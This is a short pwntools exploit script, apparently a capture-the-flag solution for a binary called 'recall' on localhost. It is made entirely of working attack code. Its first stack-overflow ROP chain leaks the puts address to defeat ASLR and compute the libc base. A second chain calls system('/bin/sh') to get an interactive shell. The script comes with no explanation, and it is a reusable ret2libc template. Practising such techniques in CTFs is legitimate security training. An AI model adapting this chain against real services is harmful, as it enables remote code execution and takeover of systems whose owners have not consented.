from pwn import *

# Set up the binary and libc

elf = context.binary = ELF('./recall')
libc = ELF('./challenge/libc.so.6')
context.log_level = 'debug'
#context.log_level = 'debug' 
# Start the process
p = remote("localhost", 1337)
#p =process()
# Create a ROP object

# Find the gadgets
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
print("pop_rdi: ",hex(ret))

SET = elf.sym['SET']
print("SET: ",hex(SET))
pay =flat(
    b'a'*40,
    pop_rdi,
    elf.got['puts'],
    elf.sym['puts'],
    pop_rdi,
    SET,
    elf.plt['gets'],
    elf.sym['main']

)
#gdb.attach(p)
p.sendline(pay)
p.sendline(p64(0x1))
#write("payload", pay)
print(p.recvlines(3))
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak - libc.sym['puts']


print("libc: ",hex(libc.address))
pay =flat(
    b'a'*40,
    pop_rdi,
    next(libc.search(b"/bin/sh")),
    libc.sym['system'],
)
#write("payload", pay)
#p.clean()
#write("payload", pay)
p.clean()

p.sendline(pay)

p.interactive()